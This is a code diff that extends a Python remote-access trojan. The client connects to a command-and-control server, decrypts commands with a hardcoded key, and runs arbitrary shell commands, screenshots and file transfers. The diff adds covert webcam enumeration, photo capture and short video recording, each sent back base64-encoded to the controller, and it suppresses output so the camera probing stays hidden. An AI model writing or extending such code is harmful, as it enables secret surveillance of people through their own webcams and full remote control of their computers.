@@ -7,6 +7,9 @@ from Crypto.Util.Padding import pad, unpad
 import os
 from PIL import Image
 import io
+import contextlib
+import cv2
+import sys
 import time
 import subprocess
 
@@ -14,10 +17,84 @@ SECRET_KEY = b'0123456789abcdef0123456789abcdef'
 C2_SERVER_IP = "127.0.0.1"
 C2_SERVER_PORT = 9090
 
+@contextlib.contextmanager
+def suppress_stdout_stderr():
+    with open(os.devnull, 'w') as devnull:
+        old_stdout = sys.stdout
+        old_stderr = sys.stderr
+        sys.stdout = devnull
+        sys.stderr = devnull
+        try:
+            yield
+        finally:
+            sys.stdout = old_stdout
+            sys.stderr = old_stderr
+
 def get_system_info():
     username = os.getlogin()
     os_version = platform.system() + " " + platform.release()
     return f"{username}|{os_version}"
+
+def list_webcams():
+    available = []
+    with suppress_stdout_stderr():
+        for i in range(5):
+            cap = cv2.VideoCapture(i)
+            if cap.read()[0]:
+                available.append(i)
+            cap.release()
+    return "[+] Webcams Index: " + ",".join(str(i) for i in available) if available else "[+] No detected webcams in this device"
+
+def take_photo(camera_index):
+    try:
+        cam = cv2.VideoCapture(int(camera_index))
+        ret, frame = cam.read()
+        cam.release()
+
+        if not ret:
+            return "[!] Could not access webcam"
+
+        _, buffer = cv2.imencode('.jpg', frame)
+        encoded = base64.b64encode(buffer).decode('utf-8')
+        return "[photo] " + encoded
+
+    except Exception as e:
+        return f"[!] Error accessing webcam: {e}"
+
+def stream_webcam(index=0, duration=5, fps=5):
+    try:
+        index = int(index)
+        cam = cv2.VideoCapture(index)
+        frames = []
+        start = time.time()
+
+        while time.time() - start < duration:
+            ret, frame = cam.read()
+            if ret:
+                frames.append(frame)
+            time.sleep(1 / fps)
+
+        cam.release()
+
+        if not frames:
+            return "[!] No frames captured"
+
+        height, width, _ = frames[0].shape
+        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
+        out = cv2.VideoWriter("stream.mp4", fourcc, fps, (width, height))
+
+        for frame in frames:
+            out.write(frame)
+        out.release()
+
+        with open("stream.mp4", "rb") as f:
+            encoded = base64.b64encode(f.read()).decode("utf-8")
+
+        os.remove("stream.mp4")
+        return "[video] " + encoded
+
+    except Exception as e:
+        return f"[!] Error in stream: {e}"
 
 def take_screenshot():
     with mss.mss() as sct:
@@ -76,7 +153,8 @@ def execute_command(command):
         return f"Error: {e}"
 
 def connect_to_c2():
-    while True:
+    exit = False
+    while not exit:
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.connect((C2_SERVER_IP, C2_SERVER_PORT))
@@ -94,7 +172,8 @@ def connect_to_c2():
                     print(f"[!] Error decrypting the command: {e}")
                     continue
 
-                if command.lower() == "exit":
+                if command.lower() == "kill":
+                    exit = True
                     break
 
                 elif command.lower() == "screenshot":
@@ -109,6 +188,26 @@ def connect_to_c2():
                     content = args[1]
                     file_name = args[2]
                     output = upload_file(content, file_name)
+
+                elif command.lower() == "listwebcams":
+                    output = list_webcams()
+
+                elif command.lower().startswith("photo"):
+                    args = command.split()
+                    if len(args) == 2 and args[1].isdigit():
+                        output = take_photo(args[1])
+                    else:
+                        output = "[!] Usage: photo <cam_index>"
+
+                elif command.lower().startswith("stream"):
+                    args = command.split()
+                    if len(args) >= 2:
+                        cam_index = args[1]
+                        duration = int(args[2]) if len(args) >= 3 else 5
+                        fps = int(args[3]) if len(args) >= 4 else 5
+                        output = stream_webcam(cam_index, duration, fps)
+                    else:
+                        output = "[!] Usage: stream <cam_index> [duration] [fps]"
 
                 else:
                     output = execute_command(command)
